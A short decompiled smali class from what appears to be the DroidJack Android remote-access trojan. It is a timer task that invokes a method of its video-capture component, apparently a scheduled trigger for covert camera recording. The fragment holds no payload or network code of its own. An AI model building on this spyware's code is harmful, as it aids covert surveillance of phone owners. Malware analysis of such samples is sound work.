.class Lnet/droidjack/server/ce;
.super Ljava/util/TimerTask;


# instance fields
.field final synthetic a:Lnet/droidjack/server/VideoCapDJ;


# direct methods
.method constructor <init>(Lnet/droidjack/server/VideoCapDJ;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/ce;->a:Lnet/droidjack/server/VideoCapDJ;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/ce;->a:Lnet/droidjack/server/VideoCapDJ;

    invoke-virtual {v0}, Lnet/droidjack/server/VideoCapDJ;->b()V

    return-void
.end method
